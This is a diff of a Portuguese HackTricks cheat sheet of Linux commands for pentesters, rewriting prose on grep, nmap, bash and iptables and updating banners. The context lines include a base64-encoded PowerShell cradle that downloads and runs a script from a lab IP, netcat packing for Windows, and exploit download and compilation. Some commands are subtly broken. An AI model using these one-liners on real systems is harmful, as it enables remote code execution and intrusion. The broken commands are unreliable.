@@ -1,9 +1,10 @@
 # Comandos Úteis do Linux
 
-![](<../../.gitbook/assets/image (9) (1) (2).png>)
+<figure><img src="/.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
 
-Use [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) para construir e automatizar facilmente fluxos de trabalho com as ferramentas comunitárias mais avançadas do mundo.\
-Acesse hoje:
+\
+Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir e **automatizar fluxos de trabalho** com facilidade, utilizando as ferramentas comunitárias mais avançadas do mundo.\
+Acesse hoje mesmo:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
 
@@ -11,11 +12,11 @@ Acesse hoje:
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
-* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Você trabalha em uma **empresa de cibersegurança**? Gostaria de ver sua **empresa anunciada no HackTricks**? Ou gostaria de ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
+* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
-* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Compartilhe suas técnicas de hacking enviando PRs para o [repositório hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
+* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Compartilhe suas técnicas de hacking enviando PRs para o [repositório hacktricks](https://github.com/carlospolop/hacktricks) e [repositório hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
 
 </details>
 
@@ -71,7 +72,7 @@ unzip file.zip
 sudo apt-get install xz-utils; unxz file.xz
 
 #Add new user
-useradd -p 'openssl passwd -1 <Password>' hacker  
+useradd -p 'openssl passwd -1 <Password>' hacker
 
 #Clipboard
 xclip -sel c < cat file.txt
@@ -138,9 +139,10 @@ sudo chattr -i file.txt #Remove the bit so you can delete it
 # List files inside zip
 7z l file.zip
 ```
-![](<../../.gitbook/assets/image (9) (1) (2).png>)
+<figure><img src="/.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
 
-Use o [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir e automatizar facilmente fluxos de trabalho com as ferramentas de comunidade mais avançadas do mundo.\
+\
+Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir e **automatizar fluxos de trabalho** facilmente, alimentados pelas ferramentas comunitárias mais avançadas do mundo.\
 Obtenha acesso hoje:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
@@ -149,7 +151,7 @@ Obtenha acesso hoje:
 ```bash
 #Base64 for Windows
 echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/9002.ps1')" | iconv --to-code UTF-16LE | base64 -w0
- 
+
 #Exe compression
 upx -9 nc.exe
 
@@ -158,7 +160,7 @@ wine exe2bat.exe nc.exe nc.txt
 
 #Compile Windows python exploit to exe
 pip install pyinstaller
-wget -O exploit.py http://www.exploit-db.com/download/31853  
+wget -O exploit.py http://www.exploit-db.com/download/31853
 python pyinstaller.py --onefile exploit.py
 
 #Compile for windows
@@ -167,78 +169,49 @@ i686-mingw32msvc-gcc -o executable useradd.c
 ```
 ## Greps
 
-O comando `grep` é usado para pesquisar por padrões em arquivos ou saídas de comandos. É uma ferramenta muito útil para encontrar informações específicas em grandes quantidades de dados.
+O comando `grep` é uma ferramenta poderosa para pesquisar padrões em arquivos de texto. Ele permite que você encontre linhas que correspondam a um determinado padrão e exiba-as na saída. Aqui estão alguns exemplos de uso comuns do comando `grep`:
 
-### Sintaxe básica
+- **Pesquisar uma palavra em um arquivo**: Para pesquisar uma palavra específica em um arquivo, use o seguinte comando:
 
-```
-grep <padrão> <arquivo>
-```
+  ```
+  grep "palavra" arquivo.txt
+  ```
 
-### Opções úteis
+  Isso exibirá todas as linhas que contêm a palavra "palavra" no arquivo "arquivo.txt".
 
-- `-i`: ignora diferenças entre letras maiúsculas e minúsculas.
-- `-r`: pesquisa recursivamente em diretórios e subdiretórios.
-- `-n`: mostra o número da linha em que o padrão foi encontrado.
-- `-v`: mostra as linhas que não contêm o padrão.
-- `-E`: permite o uso de expressões regulares estendidas.
-- `-e`: permite a pesquisa de vários padrões.
+- **Pesquisar uma palavra em vários arquivos**: Se você quiser pesquisar uma palavra em vários arquivos, use o seguinte comando:
 
-### Exemplos
+  ```
+  grep "palavra" arquivo1.txt arquivo2.txt arquivo3.txt
+  ```
 
-- Pesquisar por um padrão em um arquivo:
+  Isso exibirá todas as linhas que contêm a palavra "palavra" nos arquivos "arquivo1.txt", "arquivo2.txt" e "arquivo3.txt".
 
-```
-grep "padrão" arquivo.txt
-```
+- **Pesquisar uma palavra em todos os arquivos de um diretório**: Se você quiser pesquisar uma palavra em todos os arquivos de um diretório, use o seguinte comando:
 
-- Pesquisar por um padrão em vários arquivos:
+  ```
+  grep "palavra" diretório/*
+  ```
 
-```
-grep "padrão" arquivo1.txt arquivo2.txt arquivo3.txt
-```
+  Isso exibirá todas as linhas que contêm a palavra "palavra" em todos os arquivos do diretório especificado.
 
-- Pesquisar por um padrão em todos os arquivos de um diretório:
+- **Pesquisar uma palavra ignorando maiúsculas e minúsculas**: Se você quiser pesquisar uma palavra, mas ignorar diferenças entre maiúsculas e minúsculas, use o seguinte comando:
 
-```
-grep "padrão" *
-```
+  ```
+  grep -i "palavra" arquivo.txt
+  ```
 
-- Pesquisar por um padrão em todos os arquivos de um diretório e subdiretórios:
+  Isso exibirá todas as linhas que contêm a palavra "palavra", independentemente de estarem em maiúsculas ou minúsculas, no arquivo "arquivo.txt".
 
-```
-grep -r "padrão" *
-```
+- **Pesquisar uma palavra com contexto**: Se você quiser exibir não apenas a linha que contém a palavra pesquisada, mas também algumas linhas antes e depois dela, use o seguinte comando:
 
-- Pesquisar por um padrão em um arquivo ignorando diferenças entre letras maiúsculas e minúsculas:
+  ```
+  grep -C 2 "palavra" arquivo.txt
+  ```
 
-```
-grep -i "padrão" arquivo.txt
-```
+  Isso exibirá a linha que contém a palavra "palavra" e duas linhas antes e depois dela no arquivo "arquivo.txt".
 
-- Pesquisar por um padrão em um arquivo e mostrar o número da linha em que foi encontrado:
-
-```
-grep -n "padrão" arquivo.txt
-```
-
-- Pesquisar por um padrão em um arquivo e mostrar as linhas que não contêm o padrão:
-
-```
-grep -v "padrão" arquivo.txt
-```
-
-- Pesquisar por um padrão usando uma expressão regular:
-
-```
-grep -E "padrão1|padrão2" arquivo.txt
-```
-
-- Pesquisar por vários padrões em um arquivo:
-
-```
-grep -e "padrão1" -e "padrão2" arquivo.txt
-```
+Esses são apenas alguns exemplos de como usar o comando `grep`. Ele possui muitas outras opções e recursos que podem ser explorados para realizar pesquisas mais avançadas em arquivos de texto.
 ```bash
 #Extract emails from file
 grep -E -o "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b" file.txt
@@ -318,7 +291,27 @@ grep -Po 'd{3}[s-_]?d{3}[s-_]?d{4}' *.txt > us-phones.txt
 #Extract ISBN Numbers
 egrep -a -o "\bISBN(?:-1[03])?:? (?=[0-9X]{10}$|(?=(?:[0-9]+[- ]){3})[- 0-9X]{13}$|97[89][0-9]{10}$|(?=(?:[0-9]+[- ]){4})[- 0-9]{17}$)(?:97[89][- ]?)?[0-9]{1,5}[- ]?[0-9]+[- ]?[0-9]+[- ]?[0-9X]\b" *.txt > isbn.txt
 ```
-## Ajuda na busca do Nmap
+## Ajuda de pesquisa do Nmap
+
+O Nmap é uma ferramenta de código aberto usada para exploração de rede e auditoria de segurança. Ele fornece uma ampla gama de recursos e opções de pesquisa para ajudar os hackers a identificar hosts, serviços e vulnerabilidades em uma rede.
+
+Aqui estão alguns comandos úteis do Nmap que podem ser usados para realizar pesquisas eficazes:
+
+- **nmap -sn <IP>**: Este comando é usado para fazer uma varredura de ping em um único host ou em uma faixa de endereços IP para verificar se eles estão online.
+
+- **nmap -sS <IP>**: Este comando realiza uma varredura TCP SYN em um host específico para identificar portas abertas e serviços em execução.
+
+- **nmap -sV <IP>**: Este comando é usado para detectar a versão do serviço em execução em uma porta específica de um host.
+
+- **nmap -p <portas> <IP>**: Este comando permite especificar portas específicas a serem verificadas em um host.
+
+- **nmap -A <IP>**: Este comando ativa a detecção de sistema operacional, detecção de versão do serviço, script de varredura e detecção de firewall em um host.
+
+- **nmap -O <IP>**: Este comando é usado para detectar o sistema operacional em execução em um host.
+
+- **nmap -sU <IP>**: Este comando realiza uma varredura UDP em um host para identificar portas abertas e serviços em execução.
+
+Esses comandos são apenas alguns exemplos das muitas opções disponíveis no Nmap. É importante lembrar que o uso do Nmap para fins maliciosos é ilegal e antiético.
 ```bash
 #Nmap scripts ((default or version) and smb))
 nmap --script-help "(default or version) and *smb*"
@@ -327,77 +320,54 @@ nmap --script-help "(default or version) and smb)"
 ```
 ## Bash
 
-Bash é um shell de linha de comando para sistemas operacionais baseados em Unix. Ele é usado para executar comandos e scripts, bem como automatizar tarefas do sistema. Aqui estão alguns comandos úteis do Bash:
+Bash (Bourne Again SHell) é um interpretador de comandos de shell para sistemas operacionais baseados em Unix. É uma das shells mais populares e amplamente utilizadas no Linux.
 
+### Comandos Úteis
+
+Aqui estão alguns comandos úteis do Bash que podem ser usados para várias tarefas:
+
+- `ls`: lista os arquivos e diretórios no diretório atual.
 - `cd`: muda o diretório atual.
-- `ls`: lista o conteúdo do diretório atual.
+- `pwd`: exibe o diretório de trabalho atual.
 - `mkdir`: cria um novo diretório.
-- `rm`: remove um arquivo ou diretório.
-- `cp`: copia um arquivo ou diretório.
-- `mv`: move ou renomeia um arquivo ou diretório.
+- `rm`: remove arquivos e diretórios.
+- `cp`: copia arquivos e diretórios.
+- `mv`: move ou renomeia arquivos e diretórios.
 - `cat`: exibe o conteúdo de um arquivo.
-- `grep`: pesquisa por uma string em um arquivo ou saída de comando.
-- `chmod`: altera as permissões de um arquivo ou diretório.
-- `sudo`: executa um comando com privilégios de superusuário.
-- `echo`: exibe uma mensagem na saída padrão.
-- `export`: define uma variável de ambiente.
-- `source`: executa um script no shell atual.
-- `history`: exibe o histórico de comandos executados no shell.
+- `grep`: pesquisa por padrões em arquivos.
+- `chmod`: altera as permissões de acesso de arquivos e diretórios.
+- `chown`: altera o proprietário de arquivos e diretórios.
+- `ssh`: inicia uma sessão segura em um servidor remoto.
+- `wget`: baixa arquivos da web.
+- `tar`: cria ou extrai arquivos compactados no formato tar.
+- `find`: pesquisa arquivos e diretórios com base em critérios específicos.
+- `ps`: exibe os processos em execução.
+- `top`: exibe informações em tempo real sobre os processos em execução.
+- `kill`: encerra um processo em execução.
+- `history`: exibe o histórico de comandos digitados anteriormente.
+
+Esses são apenas alguns dos muitos comandos úteis disponíveis no Bash. Experimente-os e explore mais recursos para aprimorar suas habilidades no uso do shell.
 ```bash
 #All bytes inside a file (except 0x20 and 0x00)
 for j in $((for i in {0..9}{0..9} {0..9}{a..f} {a..f}{0..9} {a..f}{a..f}; do echo $i; done ) | sort | grep -v "20\|00"); do echo -n -e "\x$j" >> bytes; done
 ```
 ## Iptables
 
-Iptables é um firewall de pacotes para o kernel do Linux. Ele permite que você configure regras para controlar o tráfego de entrada e saída do seu sistema. As regras são organizadas em "tabelas", que são compostas por "cadeias" de regras. As tabelas mais comuns são `filter`, `nat` e `mangle`.
+O Iptables é uma ferramenta de firewall para sistemas Linux que permite configurar e gerenciar as regras de filtragem de pacotes. Ele é usado para controlar o tráfego de rede, permitindo ou bloqueando pacotes com base em várias condições.
 
-### Listando as regras
+### Comandos úteis do Iptables
 
-Para listar todas as regras do iptables, execute o seguinte comando:
+Aqui estão alguns comandos úteis do Iptables que você pode usar para configurar e gerenciar as regras de firewall:
 
-```bash
-iptables -L -n -v
-```
+- `iptables -L`: Lista todas as regras de firewall atualmente configuradas.
+- `iptables -A <chain> -p <protocol> --dport <port> -j <action>`: Adiciona uma nova regra ao final da cadeia especificada. Você precisa substituir `<chain>` pelo nome da cadeia, `<protocol>` pelo protocolo desejado (por exemplo, tcp, udp), `<port>` pela porta desejada e `<action>` pela ação a ser tomada (por exemplo, ACCEPT, DROP).
+- `iptables -D <chain> <rule_number>`: Remove a regra especificada da cadeia especificada. Você precisa substituir `<chain>` pelo nome da cadeia e `<rule_number>` pelo número da regra que deseja remover.
+- `iptables -P <chain> <policy>`: Define a política padrão para a cadeia especificada. Você precisa substituir `<chain>` pelo nome da cadeia e `<policy>` pela política desejada (por exemplo, ACCEPT, DROP).
+- `iptables -F`: Limpa todas as regras de firewall configuradas.
+- `iptables-save > <file>`: Salva todas as regras de firewall configuradas em um arquivo.
+- `iptables-restore < <file>`: Restaura as regras de firewall a partir de um arquivo.
 
-### Limpando as regras
-
-Para limpar todas as regras do iptables, execute o seguinte comando:
-
-```bash
-iptables -F
-```
-
-### Bloqueando um endereço IP
-
-Para bloquear um endereço IP específico, execute o seguinte comando:
-
-```bash
-iptables -A INPUT -s <endereço IP> -j DROP
-```
-
-### Permitindo uma porta específica
-
-Para permitir o tráfego em uma porta específica, execute o seguinte comando:
-
-```bash
-iptables -A INPUT -p tcp --dport <número da porta> -j ACCEPT
-```
-
-### Salvando as regras
-
-Para salvar as regras do iptables, execute o seguinte comando:
-
-```bash
-iptables-save > /etc/iptables/rules.v4
-```
-
-### Carregando as regras salvas
-
-Para carregar as regras salvas do iptables, execute o seguinte comando:
-
-```bash
-iptables-restore < /etc/iptables/rules.v4
-```
+Esses são apenas alguns dos comandos mais comumente usados do Iptables. Existem muitos outros comandos e opções disponíveis para personalizar e ajustar as regras de firewall de acordo com suas necessidades específicas.
 ```bash
 #Delete curent rules and chains
 iptables --flush
@@ -432,18 +402,18 @@ iptables -P OUTPUT ACCEPT
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
+* Você trabalha em uma **empresa de cibersegurança**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
 * Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
-* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Compartilhe suas técnicas de hacking enviando PRs para o [repositório hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
+* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Compartilhe seus truques de hacking enviando PRs para o [repositório hacktricks](https://github.com/carlospolop/hacktricks) e [repositório hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
 
 </details>
 
-![](<../../.gitbook/assets/image (9) (1) (2).png>)
+<figure><img src="/.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
 
 \
-Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir e **automatizar fluxos de trabalho** facilmente, alimentados pelas ferramentas comunitárias mais avançadas do mundo.\
-Obtenha acesso hoje:
+Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir e **automatizar fluxos de trabalho** com facilidade, utilizando as ferramentas comunitárias mais avançadas do mundo.\
+Acesse hoje mesmo:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
